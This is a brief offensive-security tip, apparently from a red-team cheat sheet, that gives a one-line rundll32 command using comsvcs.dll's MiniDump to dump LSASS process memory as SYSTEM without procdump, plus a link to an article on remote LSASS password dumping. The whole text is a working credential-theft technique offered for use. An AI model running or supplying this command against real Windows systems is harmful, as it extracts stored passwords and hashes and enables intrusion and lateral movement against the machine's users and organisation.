Dump LSASS memory no need to use procdump execute the following command as SYSTEM : 

'rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump "<lsass pid> lsass.dmp full"'

https://en.hackndo.com/remote-lsass-dump-passwords/
